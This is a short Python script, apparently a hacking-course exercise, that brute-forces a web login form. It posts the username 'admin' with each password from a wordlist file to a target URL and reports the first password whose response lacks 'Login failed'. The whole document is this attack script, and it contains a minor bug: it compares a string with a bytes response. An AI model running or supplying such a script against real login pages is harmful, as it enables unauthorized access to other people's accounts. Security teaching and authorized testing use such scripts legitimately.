#!/usr/bin/env python

from urllib import response
import requests

target_url = " "
data_direct = {"username": "admin", "password": "password", "Login": "submit"}
response = requests.post(target_url, data=data_direct)
print(response.content)
with open("password.list", "r") as wordlsits_file:
    for line in wordlsits_file:
        word = line.strip()
        data_direct["password"] = word
        response = requests.post(target_url, data=data_direct)
        if "Login failed" not in response.content:
            print("[+] Got the password--> " + word)
            exit()

print("[+] Reached the end of the line")
